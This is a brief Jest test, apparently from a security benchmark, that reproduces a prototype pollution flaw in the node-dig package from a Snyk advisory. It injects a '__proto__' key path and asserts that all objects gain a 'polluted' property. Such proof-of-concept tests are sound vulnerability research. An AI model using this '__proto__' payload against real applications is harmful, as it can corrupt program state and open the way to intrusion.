//https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
test("prototype pollution in node-dig", () => {
  const nodeDig = require("node-dig");
  expect({}.polluted).toBe(undefined);

  nodeDig({}, [process.env.SECBENCH_PAYLOAD || "__proto__", "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
